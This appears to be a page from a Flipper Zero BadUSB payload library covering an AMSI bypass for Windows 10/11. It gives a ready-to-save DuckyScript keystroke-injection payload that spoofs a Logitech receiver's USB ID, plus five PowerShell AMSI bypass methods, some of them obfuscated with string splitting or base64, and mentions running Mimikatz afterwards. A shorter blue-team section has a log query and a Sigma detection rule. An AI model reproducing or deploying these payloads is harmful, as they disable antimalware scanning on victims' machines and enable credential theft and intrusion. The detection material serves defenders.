# FZ-A01: AMSI Bypass

## Overview

| Property | Value |
|----------|-------|
| **ID** | FZ-A01 |
| **Name** | AMSI Bypass |
| **Difficulty** | Advanced |
| **Target OS** | Windows 10/11 |
| **Execution Time** | ~3 seconds |
| **MITRE ATT&CK** | T1562.001 (Disable or Modify Tools) |

## What This Payload Does

Bypasses the Antimalware Scan Interface (AMSI) to allow execution of PowerShell scripts that would normally be blocked by Windows Defender or other security products that integrate with AMSI.

---

## Understanding AMSI

### What is AMSI?

AMSI (Antimalware Scan Interface) is a Windows security feature that allows applications to request malware scanning of content at runtime. Key characteristics:

```
┌─────────────────────────────────────────────────────────────┐
│                        AMSI Architecture                      │
├─────────────────────────────────────────────────────────────┤
│                                                               │
│   PowerShell/Script Host                                      │
│          │                                                    │
│          ▼                                                    │
│   ┌─────────────┐                                            │
│   │ AMSI.dll    │ ◄── Loaded into every PowerShell process  │
│   └─────────────┘                                            │
│          │                                                    │
│          ▼                                                    │
│   ┌─────────────────────────┐                                │
│   │ Antimalware Provider    │ (Defender, 3rd party AV)       │
│   │ - Scans content         │                                │
│   │ - Returns verdict       │                                │
│   └─────────────────────────┘                                │
│          │                                                    │
│          ▼                                                    │
│   Script Allowed/Blocked                                      │
│                                                               │
└─────────────────────────────────────────────────────────────┘
```

### What AMSI Scans

| Content Type | Scanned |
|--------------|---------|
| PowerShell scripts | Yes |
| VBScript | Yes |
| JScript | Yes |
| .NET assemblies (4.8+) | Yes |
| Office VBA macros | Yes |
| Windows Script Host | Yes |

---

## The Payload

```ducky
REM =============================================
REM ADVANCED: AMSI Bypass
REM Target: Windows 10/11
REM Action: Bypasses AMSI for PowerShell
REM Skill: Advanced
REM WARNING: Security control bypass
REM =============================================

ID 046d:c52b Logitech:Unifying Receiver

DELAY 2500

REM Open PowerShell (not hidden initially)
GUI r
DELAY 500
STRING powershell -ep bypass
ENTER
DELAY 1500

REM AMSI Bypass - Memory Patching Method
STRINGLN $a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
STRINGLN $f=$a.GetField('amsiInitFailed','NonPublic,Static')
STRINGLN $f.SetValue($null,$true)

REM Verify bypass
STRINGLN Write-Host "AMSI Bypass Applied" -ForegroundColor Green

REM Now malicious scripts can run
REM Example: 'Invoke-Mimikatz' would now execute without AMSI blocking
```

---

## AMSI Bypass Techniques

### Method 1: amsiInitFailed Flag (Classic)

```powershell
# Sets the amsiInitFailed flag to true
# AMSI thinks it failed to initialize and skips scanning
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### Method 2: Patching AmsiScanBuffer

```powershell
# Patches the AmsiScanBuffer function to always return clean
$w = 'System.Management.Automation.A]msiUtils' -replace ']'
$c = [Ref].Assembly.GetType($w)
$f = $c.GetField('amsiContext','NonPublic,Static')
[IntPtr]$p = $f.GetValue($null)
[Runtime.InteropServices.Marshal]::WriteInt32($p, 0x80070057)
```

### Method 3: Reflection (Obfuscated)

```powershell
# More obfuscated version
$a = 'Si]stem.tic.tic.Ma]ntic.tic.nag]ement.Auto]mati]on.tic.Amsi]Utils' -replace 'tic.','' -replace ']',''
[Ref].Assembly.GetType($a).GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### Method 4: Matt Graeber's Reflection

```powershell
# Alternative reflection method
[Delegate]::CreateDelegate(("Func``3[String, antiscript]am]r, Int32]" -replace ']','s]' -replace 'antiscript',''),(([Ref].Assembly.GetType(('System.Management.Automation.{0}i{1}tils' -f 'Ams','U'))).GetField(('am]si]Init{0}ailed' -f 'F') -replace ']', '','NonPublic,Static'))).Invoke
```

### Method 5: PowerShell Downgrade

```powershell
# Force PowerShell v2 which doesn't have AMSI
powershell -version 2 -command "..."
# Note: Requires .NET 2.0 installed (rare on modern systems)
```

---

## DuckyScript Implementation

### Obfuscated Version

```ducky
REM More evasive AMSI bypass
DELAY 2500
GUI r
DELAY 500
STRING powershell -ep bypass
ENTER
DELAY 1500
STRINGLN $a=[Ref].Assembly.GetType(('Sys'+'tem.tic.Manage'+'ment.tic.Auto'+'mation.Amsi'+'Utils').Replace('tic.','')); $f=$a.GetField(('am'+'si'+'Init'+'Failed'),'NonPublic,Static'); $f.SetValue($null,$true)
```

### With String Obfuscation

```ducky
STRINGLN $b=[Convert]::FromBase64String('U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM=');$s=[Text.Encoding]::UTF8.GetString($b);$a=[Ref].Assembly.GetType($s);$a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

---

## Cross-Platform Considerations

### macOS
macOS does not have AMSI. Apple uses different security mechanisms:
- Gatekeeper (code signing verification)
- XProtect (signature-based malware detection)
- MRT (Malware Removal Tool)
- Notarization requirements

### Linux
Linux does not have AMSI. Security relies on:
- AppArmor / SELinux
- Audit framework
- Third-party EDR solutions

### Detection on Non-Windows
While AMSI bypass doesn't apply, similar evasion techniques exist:
- Disabling auditd
- Bypassing AppArmor profiles
- Kernel module manipulation

---

## Red Team Perspective

### When to Use AMSI Bypass

| Scenario | AMSI Bypass Needed |
|----------|-------------------|
| Running Mimikatz | Yes |
| Empire/Covenant agents | Yes |
| Custom PowerShell tools | Often |
| Basic recon commands | Usually no |
| System commands | No |

### Attack Chain Position

```
Initial Access → AMSI Bypass → Payload Execution → Post-Exploitation
                     ↑
                 You are here
```

### Bypass Verification

```powershell
# Test if AMSI is bypassed
# This string is detected by AMSI as malware
'Invoke-Mimikatz'  # Will error if AMSI active

# If no error, bypass worked
```

---

## Blue Team Perspective

### Detection Opportunities

1. **PowerShell Logging**
   - Script Block Logging (Event ID 4104)
   - Module Logging
   - Transcript Logging

2. **AMSI Bypass Indicators**
   - References to 'amsiInitFailed'
   - References to 'AmsiUtils'
   - Reflection on System.Management.Automation

3. **Memory Modifications**
   - ETW patches
   - AMSI.dll patches

### Detection Script

```powershell
# Search for AMSI bypass attempts in logs
Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-PowerShell/Operational'
    Id=4104
} -MaxEvents 1000 | Where-Object {
    $_.Message -match 'amsi|AmsiUtils|amsiInitFailed|AmsiScanBuffer'
} | Select TimeCreated, @{N='Script';E={$_.Message.Substring(0,500)}}
```

### Sigma Rule

```yaml
title: AMSI Bypass Attempt
status: experimental
description: Detects attempts to bypass AMSI
logsource:
    product: windows
    category: ps_script
detection:
    selection:
        ScriptBlockText|contains:
            - 'AmsiUtils'
            - 'amsiInitFailed'
            - 'AmsiScanBuffer'
            - 'amsiContext'
            - 'System.Management.Automation.Amsi'
    condition: selection
level: high
tags:
    - attack.defense_evasion
    - attack.t1562.001
```

### Prevention

1. **Constrained Language Mode**
   ```powershell
   $ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"
   ```

2. **Script Block Logging**
   - Enable via Group Policy
   - Logs all script execution

3. **Application Control**
   - AppLocker
   - WDAC (Windows Defender Application Control)

4. **EDR Solutions**
   - Monitor for AMSI tampering
   - Behavioral detection

---

## Practice Exercises

### Exercise 1: Verify AMSI Status
Check if AMSI is active:
```powershell
# This will show if AMSI blocks it
'Invoke-Mimikatz'
```

### Exercise 2: Test Bypass
After applying bypass, test again:
```powershell
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
'Invoke-Mimikatz'  # Should not error now
```

### Exercise 3: Check Logging
View what was logged:
```powershell
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -MaxEvents 10
```

---

## Payload File

Save as `FZ-A01_AMSI_Bypass.txt`:

```ducky
REM FZ-A01: AMSI Bypass
ID 046d:c52b Logitech:Unifying Receiver
DELAY 2500
GUI r
DELAY 500
STRING powershell -ep bypass
ENTER
DELAY 1500
STRINGLN [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

---

[← Advanced Scripts](README.md) | [Next: FZ-A02 UAC Bypass →](FZ-A02_UAC_Bypass.md)
